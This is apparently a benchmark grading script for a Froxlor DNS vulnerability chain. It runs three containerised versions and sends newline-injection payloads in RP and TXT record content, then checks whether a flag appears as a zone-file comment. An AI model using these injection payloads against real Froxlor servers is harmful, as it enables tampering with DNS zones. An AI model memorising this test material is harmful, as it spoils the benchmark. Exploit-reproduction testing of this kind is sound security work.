#!/usr/bin/env python3
"""Flag differential oracle for froxlor-cve-2026-41234.

Chain: CVE-2026-30932 (DomainZones.add newline injection in LOC/RP/SSHFP/TLSA,
       fixed 2.3.5 by Validate::validateDnsLoc/Rp/Sshfp/Tlsa)
    -> CVE-2026-41234 (TXT records were missed; fixed 2.3.7 by a global
       preg_replace('/[^\\x09\\x20-\\x7E]/', '', $content) + whitespace collapse).

V0 = Froxlor 2.3.4  (no content validation for LOC/RP/SSHFP/TLSA)
V1 = Froxlor 2.3.5  (validateDns* active; TXT content still unsanitized) <- target
V2 = Froxlor 2.3.7  (control chars stripped from ALL content incl. TXT)

seed:     RP record content "mbox.example.com. txt.example.com.\\n; pcb_<FLAG>"
          -> v0 stores raw newline (zone line break), v1 validateDnsRp rejects (406)
residual: TXT record content "hello\\n; pcb_<FLAG>"
          -> v1 encloseTXTContent keeps the newline (zone line break), v2 preg_replace
             collapses it into a single line (no standalone comment)

Flag channel: the generated BIND zone file /etc/bind/domains/pcb.local.zone is read
via docker exec after running the REAL DNS rebuild cron (froxlor:cron -r 4); the
observation is the zone file's comment lines, which contain the flag only when the
newline injection worked.
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[1]))
from flag_oracle import new_flag, validate_case_strict  # noqa: E402

sys.path.insert(0, str(HERE))
import poc_common as p  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()
p.FLAG = FLAG


def seed_exploit(*, version="v0"):
    content = f"mbox.example.com. txt.example.com.\n; pcb_{FLAG}"
    return p.probe(version, "RP", content, FLAG)


def residual_exploit(*, version="v1"):
    content = f"hello\n; pcb_{FLAG}"
    return p.probe(version, "TXT", content, FLAG)


def gate() -> dict:
    return validate_case_strict(
        flag=FLAG,
        original_on_v0=seed_exploit(version="v0"),
        original_on_v1=seed_exploit(version="v1"),
        bypass_on_v1=residual_exploit(version="v1"),
        bypass_on_v2=residual_exploit(version="v2"),
    )


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _wait_ready(version: str, tries: int = 90) -> bool:
    port = p.APP_HOST[version]
    for _ in range(tries):
        try:
            import urllib.request
            with urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=5) as r:
                if r.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(4)
    return False


def _profile_flags(profiles):
    flags = []
    for pr in profiles:
        flags += ["--profile", pr]
    return flags


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    p.FLAG = FLAG
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(profiles)
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "build", env=env)
    if r.returncode != 0:
        return {"error": "build failed", "stderr": r.stderr[-2500:]}
    r = _compose(*all_profiles, "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2500:]}
    ready = {v: _wait_ready(v) for v in profiles}
    result = gate()
    result["_env_ready"] = ready
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
